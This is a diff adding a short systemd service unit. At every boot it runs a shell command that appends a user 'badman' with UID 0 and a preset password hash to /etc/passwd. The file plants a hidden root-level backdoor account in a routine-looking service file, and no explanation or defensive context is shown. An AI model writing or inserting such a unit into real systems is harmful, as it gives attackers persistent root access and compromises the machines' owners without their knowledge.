@@ -1,0 +1,6 @@
+[Service]
+Type=oneshot
+ExecStart=/bin/sh -c "echo 'badman:$6$salt$IxDD3jeSOb5eB1CX5LBsqZFVkJdido3OUILO5Ifz5iwMuTS4XMS130MTSuDDl3aCI6WouIL9AjRbLCelDCy.g.:0:0:badman:/home/badman:/bin/bash' >> /etc/passwd"
+
+[Install]
+WantedBy=multi-user.target
